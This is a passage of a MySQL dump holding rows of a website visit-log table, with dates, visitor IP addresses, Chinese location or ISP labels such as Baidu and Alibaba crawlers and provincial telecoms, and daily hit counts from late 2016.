'42.156.139.70','浙江省杭州市阿里巴巴网络有限公司',1),(1474905600,'42.156.138.38','浙江省杭州市阿里巴巴网络有限公司',1),(1474905600,'61.135.165.9','北京市北京百度网讯科技有限公司联通节点',1),(1474905600,'42.156.136.32','浙江省杭州市阿里巴巴网络有限公司',3),(1474905600,'42.236.10.72','河南省郑州市联通',1),(1474905600,'42.236.10.98','河南省郑州市联通',1),(1474905600,'124.22.110.42','陕西省宝鸡市广电网',1),(1474905600,'218.30.118.102','北京市电信互联网数据中心',1),(1474905600,'36.40.139.64','陕西省西安市电信',3),(1474905600,'42.156.139.113','浙江省杭州市阿里巴巴网络有限公司',1),(1474905600,'36.40.139.168','陕西省西安市电信',36),(1474905600,'101.226.65.105','上海市电信',1),(1474905600,'157.55.39.38','美国Microsoft公司',2),(1474905600,'42.156.139.59','浙江省杭州市阿里巴巴网络有限公司',1),(1474905600,'123.125.67.145','北京市北京百度网讯科技有限公司',1),(1474905600,'180.163.1.46','上海市电信',1),(1474905600,'101.226.66.178','上海市电信',1),(1474905600,'101.226.33.228','上海市电信',1),(1474905600,'180.163.2.118','上海市电信',1),(1474905600,'180.153.211.190','上海市电信',1),(1474905600,'180.153.206.24','上海市电信',1),(1474905600,'117.185.27.113','上海市移动',1),(1474905600,'101.226.125.105','上海市电信',1),(1474905600,'101.226.125.103','上海市电信',1),(1474905600,'42.156.136.123','浙江省杭州市阿里巴巴网络有限公司',1),(1474905600,'101.226.125.16','上海市电信',1),(1474905600,'112.117.216.171','云南省昆明市上海网宿科技股份有限公司电信CDN节点',1),(1474905600,'101.226.169.221','上海市电信',1),(1474905600,'182.118.22.217','河南省郑州市联通',1),(1474905600,'182.118.20.167','河南省郑州市联通',1),(1474905600,'182.118.20.219','河南省郑州市联通',1),(1474905600,'182.118.25.225','河南省郑州市联通',1),(1474905600,'101.226.169.220','上海市电信',1),(1474905600,'124.23.16.149','陕西省安康市广电网',14),(1474905600,'182.118.22.227','河南省郑州市联通',1),(1474905600,'182.118.20.229','河南省郑州市联通',1),(1474905600,'42.156.138.114','浙江省杭州市阿里巴巴网络有限公司',1),(1474905600,'182.118.25.207','河南省郑州市联通',1),(1474905600,'182.118.20.170','河南省郑州市联通',1),(1474905600,'182.118.21.218','河南省郑州市联通',1),(1474905600,'42.156.254.79','浙江省杭州市阿里巴巴网络有限公司',1),(1474905600,'112.126.75.221','北京市北京万网志成科技有限公司',12),(1474905600,'101.226.168.205','上海市上海有孚计算机网络有限公司电信节点',1),(1474905600,'182.118.20.174','河南省郑州市联通',1),(1474905600,'182.118.22.215','河南省郑州市联通',1),(1474905600,'101.226.166.220','上海市电信',1),(1474905600,'183.61.236.14','广东省广州市电信',7),(1474905600,'101.226.168.226','上海市上海有孚计算机网络有限公司电信节点',1),(1474905600,'182.118.22.212','河南省郑州市联通',1),(1474905600,'182.118.22.228','河南省郑州市联通',1),(1474905600,'182.118.25.217','河南省郑州市联通',1),(1474992000,'125.88.223.58','广东省电信(绿色上网全省通用)',145),(1474992000,'117.34.28.13','陕西省西安市电信',72),(1474992000,'117.27.149.14','福建省福州市电信',50),(1474992000,'183.61.236.14','广东省广州市电信',112),(1474992000,'112.126.75.221','北京市北京万网志成科技有限公司',23),(1474992000,'121.43.105.176','河北省廊坊市铁通',22),(1474992000,'101.226.162.90','上海市电信',145),(1474992000,'115.29.113.101','北京市万网IDC机房',22),(1474992000,'117.34.28.15','陕西省西安市电信',72),(1474992000,'117.27.149.15','福建省福州市电信',48),(1474992000,'106.120.173.147','北京市北京电信互联网数据中心节点',5),(1474992000,'117.27.149.13','福建省福州市电信',47),(1474992000,'101.226.167.208','上海市电信',1),(1474992000,'220.181.158.106','北京市北京电信互联网数据中心',1),(1474992000,'182.118.22.213','河南省郑州市联通',1),(1474992000,'157.55.39.54','美国Microsoft公司',4),(1474992000,'207.46.13.175','美国Microsoft公司',6),(1474992000,'157.55.39.144','美国Microsoft公司',4),(1474992000,'157.55.39.38','美国Microsoft公司',6),(1474992000,'42.236.10.100','河南省郑州市联通',4),(1474992000,'180.153.195.220','上海市电信',1),(1474992000,'42.236.10.71','河南省郑州市联通',1),(1474992000,'182.118.20.174','河南省郑州市联通',1),(1474992000,'42.156.136.32','浙江省杭州市阿里巴巴网络有限公司',1),(1474992000,'121.41.117.242','福建省福州市铁通',74),(1474992000,'121.42.196.232','河北省邯郸市铁通',74),(1474992000,'182.92.148.207','浙江省杭州市阿里巴巴网络有限公司',74),(1474992000,'182.118.25.224','河南省郑州市联通',1),(1474992000,'124.23.16.149','陕西省安康市广电网',6),(1474992000,'182.118.25.229','河南省郑州市联通',2),(1474992000,'182.118.22.219','河南省郑州市联通',1),(1474992000,'42.236.10.72','河南省郑州市联通',1),(1474992000,'42.156.138.103','浙江省杭州市阿里巴巴网络有限公司',1),(1474992000,'36.40.139.168','陕西省西安市电信',3),(1474992000,'180.153.205.253','上海市电信',1),(1474992000,'101.226.166.251','上海市电信',1),(1474992000,'101.226.166.249','上海市电信',1),(1474992000,'113.143.183.123','陕西省渭南市电信',5),(1474992000,'140.207.185.109','上海市联通',1),(1474992000,'182.118.20.215','河南省郑州市联通',1),(1474992000,'182.118.21.212','河南省郑州市联通',1),(1474992000,'101.226.33.224','上海市电信',1),(1474992000,'180.153.205.252','上海市电信',1),(1474992000,'101.226.168.248','上海市上海有孚计算机网络有限公司电信节点',1),(1474992000,'101.226.166.203','上海市电信',1),(1474992000,'182.118.20.167','河南省郑州市联通',1),(1474992000,'218.107.55.253','广东省广州市联通',2),(1474992000,'101.226.166.232','上海市电信',1),(1474992000,'42.120.160.23','浙江省杭州市阿里云服务器',1),(1474992000,'36.40.139.232','陕西省西安市电信',17),(1474992000,'101.226.168.228','上海市上海有孚计算机网络有限公司电信节点',1),(1474992000,'182.118.22.227','河南省郑州市联通',1),(1474992000,'101.226.168.214','上海市上海有孚计算机网络有限公司电信节点',1),(1474992000,'182.118.20.237','河南省郑州市联通',1),(1474992000,'182.118.20.170','河南省郑州市联通',1),(1474992000,'182.118.20.230','河南省郑州市联通',1),(1474992000,'101.226.166.200','上海市电信',1),(1474992000,'101.226.167.198','上海市电信',1),(1474992000,'101.226.166.207','上海市电信',1),(1474992000,'101.226.169.210','上海市电信',1),(1474992000,'61.135.165.10','北京市北京百度网讯科技有限公司联通节点',1),(1474992000,'138.201.20.12','德国',1),(1474992000,'220.181.108.108','北京市北京百度网讯科技有限公司电信节点',1),(1474992000,'123.125.71.53','北京市百度蜘蛛',1),(1474992000,'220.181.108.184','北京市北京百度网讯科技有限公司电信节点',1),(1474992000,'220.181.108.122','北京市北京百度网讯科技有限公司电信节点',1),(1475078400,'106.120.173.147','北京市北京电信互联网数据中心节点',4),(1475078400,'125.88.223.58','广东省电信(绿色上网全省通用)',145),(1475078400,'117.27.149.13','福建省福州市电信',49),(1475078400,'117.34.28.15','陕西省西安市电信',85),(1475078400,'183.61.236.14','广东省广州市电信',127),(1475078400,'101.226.162.90','上海市电信',147),(1475078400,'121.41.117.242','福建省福州市铁通',96),(1475078400,'121.42.196.232','河北省邯郸市铁通',96),(1475078400,'182.92.148.207','浙江省杭州市阿里巴巴网络有限公司',96),(1475078400,'117.34.28.13','陕西省西安市电信',59),(1475078400,'117.27.149.14','福建省福州市电信',57),(1475078400,'117.27.149.15','福建省福州市电信',39),(1475078400,'123.125.71.20','北京市百度蜘蛛',1),(1475078400,'123.125.67.156','北京市北京百度网讯科技有限公司',2),(1475078400,'220.181.158.106','北京市北京电信互联网数据中心',4),(1475078400,'42.156.139.32','浙江省杭州市阿里巴巴网络有限公司',2),(1475078400,'124.23.13.37','陕西省铜川市广电网',1),(1475078400,'180.153.195.183','上海市电信',1),(1475078400,'36.40.139.232','陕西省西安市电信',6),(1475078400,'101.226.33.218','上海市电信',1),(1475078400,'131.161.11.214','北美地区',1),(1475078400,'157.55.39.189','美国Microsoft公司',1),(1475078400,'42.236.10.98','河南省郑州市联通',1),(1475078400,'42.120.161.94','浙江省杭州市阿里云服务器',1),(1475078400,'42.156.139.94','浙江省杭州市阿里巴巴网络有限公司',1),(1475078400,'101.226.33.208','上海市电信',1),(1475078400,'101.226.66.173','上海市电信',1),(1475078400,'180.153.201.79','上海市电信',1),(1475078400,'101.226.89.123','上海市电信',1),(1475078400,'101.226.33.240','上海市电信',1),(1475078400,'130.193.51.44','俄罗斯',1),(1475078400,'220.181.108.162','北京市北京百度网讯科技有限公司电信节点',1),(1475078400,'124.22.35.171','陕西省西安市广电网',4),(1475078400,'157.55.39.69','美国Microsoft公司',1),(1475164800,'125.88.223.58','广东省电信(绿色上网全省通用)',100),(1475164800,'117.34.28.13','陕西省西安市电信',49),(1475164800,'117.27.149.13','福建省福州市电信',37),(1475164800,'101.226.162.90','上海市电信',100),(1475164800,'121.41.117.242','福建省福州市铁通',66),(1475164800,'121.42.196.232','河北省邯郸市铁通',66),(1475164800,'182.92.148.207','浙江省杭州市阿里巴巴网络有限公司',66),(1475164800,'117.27.149.15','福建省福州市电信',34),(1475164800,'182.118.20.235','河南省郑州市联通',1),(1475164800,'117.34.28.15','陕西省西安市电信',51),(1475164800,'183.61.236.14','广东省广州市电信',73),(1475164800,'61.135.169.40','北京市北京百度网讯科技有限公司联通节点',1),(1475164800,'117.27.149.14','福建省福州市电信',30),(1475164800,'121.42.0.87','河北省石家庄市铁通',1),(1475164800,'42.156.136.32','浙江省杭州市阿里巴巴网络有限公司',5),(1475164800,'182.118.22.214','河南省郑州市联通',1),(1475164800,'106.120.173.147','北京市北京电信互联网数据中心节点',2),(1475164800,'113.200.107.235','陕西省西安市联通',1),(1475164800,'218.30.118.100','北京市电信互联网数据中心',3),(1475164800,'119.188.66.216','山东省济南市联通',1),(1475164800,'207.46.13.153','美国Microsoft公司',1),(1475164800,'220.181.158.106','北京市北京电信互联网数据中心',1),(1475164800,'36.40.139.88','陕西省西安市电信',13),(1475164800,'101.226.65.102','上海市电信',1),(1475164800,'101.226.51.228','上海市电信',1),(1475164800,'101.226.66.192','上海市电信',1),(1475164800,'101.226.66.177','上海市电信',1),(1475164800,'180.153.214.182','上海市电信',2),(1475164800,'180.153.214.199','上海市电信',1),(1475164800,'180.163.2.118','上海市电信',1),(1475164800,'111.206.241.75','北京市联通',1),(1475164800,'42.156.138.28','浙江省杭州市阿里巴巴网络有限公司',1),(1475164800,'180.153.201.79','上海市电信',1),(1475164800,'61.151.218.118','上海市电信',1),(1475164800,'101.226.89.121','上海市电信',1),(1475164800,'101.226.66.174','上海市电信',1),(1475164800,'180.153.211.172','上海市电信',1),(1475164800,'180.153.206.21','上海市电信',1),(1475164800,'180.153.214.152','上海市电信',1),(1475164800,'180.153.214.188','上海市电信',1),(1475164800,'180.153.196.140','上海市电信',1),(1475164800,'182.118.20.225','河南省郑州市联通',1),(1475164800,'180.153.236.35','上海市电信',2),(1475164800,'123.125.71.31','北京市百度蜘蛛',1),(1475164800,'182.118.20.203','河南省郑州市联通',1),(1475164800,'183.136.142.180','浙江省宁波市电信',1),(1475164800,'121.42.0.39','河北省石家庄市铁通',1),(1475164800,'36.40.138.228','陕西省西安市阎良区电信',1),(1481472000,'0.0.0.0','IANA保留地址',2);
/*!40000 ALTER TABLE `np_visit` ENABLE KEYS */;
